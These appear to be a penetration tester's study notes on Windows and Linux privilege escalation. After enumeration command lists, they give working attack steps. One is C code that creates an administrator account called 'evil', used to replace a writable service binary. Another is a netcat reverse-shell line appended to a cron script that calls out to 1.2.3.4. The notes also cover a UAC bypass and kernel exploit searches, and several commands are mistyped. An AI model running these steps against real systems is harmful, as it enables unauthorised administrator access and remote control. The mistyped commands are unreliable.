Basic Linux Privilege Escalation - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
Basic Win Priv Esc - https://www.fuzzysecurity.com/tutorials/16.html

Automated Enum:
windows-privesc-check
unix-provesc-check
=========================================================================================================
Enumerating
- Users
- Hostname
- OS & architecture
- Processes & Services
- Network Info
- Firewall Status & Rules
- Scheduled Tasks
- Installed Apps & Patch Levels
- Readable/Writeable files and directories
- Unmounted Disks
- Device Drivers & Kernel Modules
- Binaries that AutoElevate

WIN
whoami
net user
net user username
hostname
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
tasklist /SVC
ipconfig /all
route pront
netstat -ano
netsh advfirewall show currentprofile
netsh advfirewall firewall shwo rule name=all
schtasks /query /fo LIST /v
wmic product get name, version, vendor
wmic qfe Caption, Description, HotFixID, InstalledOn
accesschk.exe -uws "Everyone" "C:\Program Files"
PS C:\Tools\privilege_escalation\SysinternalsSuite>Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
mountvol
powershell --> driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer

LINUX
whoami
id
cat /etc/passwd
hostname
cat /etc/issue
cat /etc/*-release
uname -a
ps axu
ip a
/sbin/route
ss -anp
netstat
iptables
ls -lah /etc/cron*
cat /etc/crontab
dpkg -l
find / -writable -type d 2>/dev/null
cat /etc/fstab
mount
/bin/lsblk
lsmod
/sbin/modinfo libata
find / -perm -u=s -type f 2>/dev/null

=========================================================================================================
WIN PRIV ESC

privileges use access tokens with SID (https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
those are maintained by the Windows Local Security Authority

integrity mechanism - integiry levels to apps, processes and securable objects (what can those apps/proc/etc do)
system rights
high integrity - administrative rights
medium - standard user rights
low - restricted user in sandboxed processes

UAC - user account control - forces apps and tasks to run in the context of a non-admin account until admin authorizes elevated access
has credential prompt / consent prompt


by default admin has 2 integrity tokens medium and admin and runs on medium by default
whoami /groups

to change to admin integrity for example
powershell.exe Start-Process cmd.exe -Verb runAs
==============
UAC bypass
example - fodhelper.exe
==============
Insecure File Permissions - exploit on services that run as nt authority\system

Software developer creates a program that runs as a Windows service.
During the installation, the developer does not secure the permissions of the program,
allowing full read and write access to all members of the Everyone group.
As a result, a lower-privileged user could replace the program with a malicious one.

list running services
Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}

enum permissions of targeted service

icacls "C:\Program Files\Serviio\bin\ServiioService.exe"

#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user evil Ev!lpass /add");
  i = system ("net localgroup administrators evil /add");
  
  return 0;
}

compile above code
i686-w64-mingw32-gcc adduser.c -o adduser.exe

move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"
net stop Serviio

wmic service where caption="Serviio" get name, caption, state, startmode

if automatic restart - shuti down the machine to restart the service
shutdown /r /t 0

after reboot check users
net localgroup Administrators
==============
Unquoted Service Paths

For example, imagine that we have a service stored in a path such as C:\Program Files\My Program\My Service\service.exe.
If the service path is stored unquoted, whenever Windows starts the service it will attempt to run an executable from the following paths:

C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
==============
Windows Kernel Vulnerabilities

enum drivers
driverquery /v

searchsploit <drivername>

=========================================================================================================
LINUX PRIV ESC
Insecure File Permissions

CRON
grep "CRON" /var/log/cron.log

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1.2.3.4 1234 >/tmp/f" >> cron_script.sh
nc -lnvp 1234

/etc/passwd
For backwards compatibility, if a password hash is present in the second column of a /etc/passwd user record,
it is considered valid for authentication and it takes precedence over the respective entry in /etc/shadow if available.

==============
Kernel Vuln

gather info about target OS
/etc/issue
uname -r
arch

searchsploit linux kernel ubuntu 16.03

gcc 12345.c -o exploit

find / -perm -u=s -type f 2>/dev/null
getcap -r /
